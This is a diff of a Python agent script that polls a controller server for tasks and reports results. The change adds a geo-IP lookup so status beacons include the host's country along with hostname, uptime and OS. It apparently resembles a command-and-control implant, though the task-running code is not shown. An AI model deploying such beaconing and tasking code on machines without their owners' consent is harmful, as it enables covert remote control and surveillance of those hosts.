@@ -1,12 +1,6 @@
-import time
-import uuid
-import requests
-import platform
-import psutil
-import os
-import subprocess
-import websockets
-import asyncio
+import time, uuid,requests,platform,psutil,os,subprocess,asyncio
+
+from datetime import timedelta
 
 SERVER_URL = "http://127.0.0.1:5000"
 #AGENT_ID = str(uuid.uuid4())
@@ -20,12 +14,16 @@ headers = {
         "X-Session-ID": f"{AGENT_ID}"
 }
 
+def get_country():
+    get_region = requests.get("https://www.whatismyip.net/geoip/")
+    return get_region.json().get("country")
+
 def get_uptime():
     boot_time = psutil.boot_time()
     uptime_seconds = time.time() - boot_time
-    uptime_minutes = uptime_seconds / 60
+    uptime_duration = timedelta(seconds=uptime_seconds)
 
-    return f"{uptime_minutes:.2f}"
+    return uptime_duration
 
 def get_task():
     try:
@@ -53,7 +51,7 @@ def send_msg(result):
         pass
 
 def status(): 
-    payload = {"agent_id": AGENT_ID, "hostname":platform.node(),"uptime":get_uptime(), "os":platform.system() }
+    payload = {"agent_id": AGENT_ID, "hostname":platform.node(),"uptime":str(get_uptime()), "os":platform.system(), "country":get_country() }
 
     try:
         resp = requests.post(SERVER_URL + "/status", json=payload, headers=headers)
